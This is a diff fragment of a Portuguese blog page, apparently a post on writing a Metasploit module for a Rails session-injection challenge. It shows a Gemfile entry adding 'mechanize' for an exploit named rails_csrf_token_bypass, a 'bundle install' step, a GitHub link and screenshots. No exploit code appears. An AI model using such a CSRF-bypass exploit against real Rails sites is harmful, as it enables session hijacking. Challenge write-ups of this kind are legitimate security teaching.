+</pre></td><td class='code'><pre><code class='Ruby'><span class='line'><span class="n">group</span> <span class="ss">:development</span><span class="p">,</span> <span class="ss">:test</span> <span class="k">do</span>
+</span><span class='line'>  <span class="c1"># Other gems.........</span>
+</span><span class='line'>  <span class="c1"># Mechanize for exploit rails_csrf_token_bypass</span>
+</span><span class='line'>  <span class="n">gem</span> <span class="s1">&#39;mechanize&#39;</span>
+</span><span class='line'><span class="k">end</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Agora basta executar:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>bundle install
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><a href="https://github.com/joridos/Rails-session-injection-challenge">GitHub source code</a></p>
+
+<p>E usar:</p>
+
+<h1><img src="/images/rails_csrf01.png" alt="Metasploit" /></h1>
+
+<h1><img src="/images/rails_csrf02.png" alt="Metasploit" /></h1>
+
+<h1><img src="/images/rails_csrf03.png" alt="Metasploit" /></h1>
+
+<h1><img src="/images/rails_csrf04.png" alt="Metasploit" /></h1>
+
+<h1><img src="/images/rails_csrf05.png" alt="Metasploit" /></h1>
+
+<h1><img src="/images/rails_csrf06.png" alt="Metasploit" /></h1>
+</div>
+  
+  
+
+
+    </article>
+  
   <div class="pagination">
     
     <a href="/blog/archives">Blog Archives</a>
@@ -77,6 +550,10 @@
     <section>
   <h1>Recent Posts</h1>
   <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/03/31/rails-session-injection-challenge-criando-um-modulo-para-o-metasploit/">Rails Session Injection Challenge: Criando Um Módulo Para O Metasploit</a>
+      </li>
     
   </ul>
 </section>
